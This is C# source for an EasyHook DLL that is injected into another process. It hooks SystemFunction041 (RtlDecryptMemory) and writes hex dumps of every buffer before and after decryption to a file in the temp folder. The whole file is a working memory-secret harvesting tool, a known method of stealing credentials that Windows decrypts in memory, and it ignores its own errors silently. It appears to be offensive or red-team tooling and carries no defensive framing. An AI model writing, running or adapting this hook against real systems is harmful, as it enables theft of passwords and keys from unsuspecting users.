using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using EasyHook;

namespace test
{
    public class SystemFunction041Hook : IEntryPoint
    {
        private LocalHook _hook;
        private static readonly string LogFilePath = Path.Combine(Path.GetTempPath(), "AAAA.txt");

        // SystemFunction041 (RtlDecryptMemory) delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        private delegate uint SystemFunction041Delegate(IntPtr buffer, uint length, uint flags);

        // Import the original function
        [DllImport("Advapi32.dll", EntryPoint = "SystemFunction041", CallingConvention = CallingConvention.StdCall)]
        private static extern uint SystemFunction041(IntPtr buffer, uint length, uint flags);

        private static void LogToFile(string message)
        {
            try
            {
                using (StreamWriter writer = new StreamWriter(LogFilePath, true))
                {
                    writer.WriteLine($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}");
                }
            }
            catch
            {
                // Silently ignore logging errors
            }
        }

        public SystemFunction041Hook(RemoteHooking.IContext context, string channelName)
        {
        }

        public void Run(RemoteHooking.IContext context, string channelName)
        {
            try
            {
                // Install hook
                _hook = LocalHook.Create(
                    LocalHook.GetProcAddress("Advapi32.dll", "SystemFunction041"),
                    new SystemFunction041Delegate(SystemFunction041Hook_Detour),
                    this);

                _hook.ThreadACL.SetExclusiveACL(new int[] { 0 });

                LogToFile("Hooking SystemFunction041 at " + LocalHook.GetProcAddress("Advapi32.dll", "SystemFunction041"));

                RemoteHooking.WakeUpProcess();

                // Wait for host process termination...
                while (true)
                {
                    System.Threading.Thread.Sleep(500);
                }
            }
            catch (Exception ex)
            {
                LogToFile("Error: " + ex.Message);
            }
        }

        private uint SystemFunction041Hook_Detour(IntPtr buffer, uint length, uint flags)
        {
            try
            {
                if (buffer == IntPtr.Zero || length <= 0)
                {
                    LogToFile("[*] Buffer is NULL or invalid length");
                    return SystemFunction041(buffer, length, flags);
                }

                // Read input buffer
                try
                {
                    byte[] inputBuffer = new byte[length];
                    Marshal.Copy(buffer, inputBuffer, 0, (int)length);
                    LogToFile("\n[*] Input Buffer:");
                    HexdumpWithAscii(inputBuffer, buffer, (int)length);
                }
                catch (Exception e)
                {
                    LogToFile("[!] Failed to read input buffer: " + e.Message);
                }

                // Call original function
                uint result = SystemFunction041(buffer, length, flags);

                LogToFile("[*] Return: " + result);

                // Read output buffer after function call
                if (buffer != IntPtr.Zero && length > 0)
                {
                    try
                    {
                        byte[] outputBuffer = new byte[length];
                        Marshal.Copy(buffer, outputBuffer, 0, (int)length);
                        LogToFile("\n[*] Output Buffer:");
                        HexdumpWithAscii(outputBuffer, buffer, (int)length);
                    }
                    catch (Exception e)
                    {
                        LogToFile("[!] Failed to read output buffer: " + e.Message);
                    }
                }

                return result;
            }
            catch (Exception ex)
            {
                LogToFile("[!] Hook error: " + ex.Message);
                return SystemFunction041(buffer, length, flags);
            }
        }

        // Pretty hexdump function (offset | hex | ascii)
        private static void HexdumpWithAscii(byte[] buffer, IntPtr basePtr, int length)
        {
            StringBuilder output = new StringBuilder();
            
            for (int i = 0; i < buffer.Length; i += 16)
            {
                int chunkSize = Math.Min(16, buffer.Length - i);
                byte[] chunk = new byte[chunkSize];
                Array.Copy(buffer, i, chunk, 0, chunkSize);

                // Offset
                string offset = (basePtr.ToInt64() + i).ToString("X").PadRight(16, ' ') + "  ";
                output.Append(offset);

                // Hex
                StringBuilder hex = new StringBuilder();
                for (int j = 0; j < chunk.Length; j++)
                {
                    hex.Append(chunk[j].ToString("x2") + " ");
                }
                string hexString = hex.ToString().PadRight(16 * 3 + 2, ' ');
                output.Append(hexString);

                // ASCII
                output.Append(" ");
                for (int j = 0; j < chunk.Length; j++)
                {
                    char c = (chunk[j] >= 0x20 && chunk[j] <= 0x7e) ? (char)chunk[j] : '.';
                    output.Append(c);
                }
                output.AppendLine();
            }
            
            LogToFile(output.ToString().TrimEnd());
        }
    }

    // Keep the original Class1 for compatibility
    public class Class1
    {
    }
}
